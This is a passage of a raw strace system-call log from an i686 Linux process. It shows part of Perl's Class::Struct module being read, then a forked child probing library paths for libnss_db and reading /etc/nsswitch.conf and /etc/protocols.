$pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
10104 20:03:04.014343 _llseek(10, 6916, [6916], SEEK_SET) = 0
10104 20:03:04.014360 _llseek(10, 0, [6916], SEEK_CUR) = 0
10104 20:03:04.014371 close(10)         = 0
10104 20:03:04.014609 _llseek(8, 1334, [1334], SEEK_SET) = 0
10104 20:03:04.014626 _llseek(8, 0, [1334], SEEK_CUR) = 0
10104 20:03:04.014637 close(8)          = 0
10104 20:03:04.015408 brk(0x82ff000)    = 0x82ff000
10104 20:03:04.015793 _llseek(6, 2689, [2689], SEEK_SET) = 0
10104 20:03:04.015829 _llseek(6, 0, [2689], SEEK_CUR) = 0
10104 20:03:04.015840 close(6)          = 0
10104 20:03:04.016131 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dc6908) = 10105
10105 20:03:04.078085 getppid()         = 10104
10105 20:03:04.078986 open("/etc/nsswitch.conf", O_RDONLY) = 6
10105 20:03:04.079019 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10105 20:03:04.079041 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f8c000
10105 20:03:04.079057 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10105 20:03:04.079126 read(6, "", 4096) = 0
10105 20:03:04.079156 close(6)          = 0
10105 20:03:04.079201 munmap(0xb7f8c000, 4096) = 0
10105 20:03:04.079282 open("/etc/ld.so.cache", O_RDONLY) = 6
10105 20:03:04.079315 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10105 20:03:04.079367 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d93000
10105 20:03:04.079409 close(6)          = 0
10105 20:03:04.079421 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10105 20:03:04.079440 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079454 stat64("/lib/tls/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079478 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079508 stat64("/lib/tls/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079520 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079533 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.079550 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079563 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.079580 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079592 stat64("/lib/tls/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079603 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079615 stat64("/lib/tls/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079626 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079646 stat64("/lib/tls/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079657 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079668 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.079685 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079697 stat64("/lib/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079708 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079720 stat64("/lib/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079731 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079742 stat64("/lib/i686/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079753 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079764 stat64("/lib/i686", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079775 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079786 stat64("/lib/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079797 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079809 stat64("/lib/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079819 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079831 stat64("/lib/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079841 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079852 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.079868 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079881 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079893 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079905 stat64("/usr/lib/tls/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.079965 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.079995 stat64("/usr/lib/tls/i686/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080024 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080036 stat64("/usr/lib/tls/i686", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080047 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080060 stat64("/usr/lib/tls/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080072 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080084 stat64("/usr/lib/tls/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080095 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080108 stat64("/usr/lib/tls/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080132 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080144 stat64("/usr/lib/tls", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080155 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080168 stat64("/usr/lib/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080179 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080191 stat64("/usr/lib/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080206 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080219 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.080236 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080248 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.080264 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080277 stat64("/usr/lib/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080288 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080300 stat64("/usr/lib/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080311 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080323 stat64("/usr/lib/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080334 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080345 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
10105 20:03:04.080362 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080375 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080387 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080400 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080452 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080486 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080516 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080559 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080571 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080584 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080596 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080609 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080620 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080633 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080644 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080657 stat64("/lib/i486-linux-gnu/tls", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080668 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080681 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080693 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080706 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080718 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080730 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080742 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080757 stat64("/lib/i486-linux-gnu/i686", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080769 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080782 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080794 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080807 stat64("/lib/i486-linux-gnu/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080818 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080831 stat64("/lib/i486-linux-gnu/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080842 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080854 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.080871 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080885 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080898 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.080955 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.080984 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081012 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081025 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081039 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081065 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081079 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081091 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081106 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081118 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081131 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081143 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081156 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081167 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081181 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081193 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081206 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081218 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081231 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081243 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081256 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081268 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081284 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081296 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081309 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081321 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081334 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfa446dc) = -1 ENOENT (No such file or directory)
10105 20:03:04.081345 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10105 20:03:04.081358 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10105 20:03:04.081377 munmap(0xb7d93000, 29913) = 0
10105 20:03:04.081398 open("/etc/ld.so.cache", O_RDONLY) = 6
10105 20:03:04.081455 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10105 20:03:04.081488 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d93000
10105 20:03:04.081512 close(6)          = 0
10105 20:03:04.081523 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10105 20:03:04.081538 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
10105 20:03:04.081554 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10105 20:03:04.081657 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10105 20:03:04.081678 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d88000
10105 20:03:04.081691 mmap2(0xb7d91000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d91000
10105 20:03:04.081708 close(6)          = 0
10105 20:03:04.081731 munmap(0xb7d93000, 29913) = 0
10105 20:03:04.081747 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10105 20:03:04.081764 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10105 20:03:04.081784 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10105 20:03:04.081801 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d9a000
10105 20:03:04.081812 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10105 20:03:04.082095 close(6)          = 0
10105 20:03:04.082105 munmap(0xb7d9a000, 4096) = 0
10105 20:03:04.082124 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10105 20:03:04.082138 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10105 20:03:04.082154 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d9a000
10105 20:03:04.082165 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF 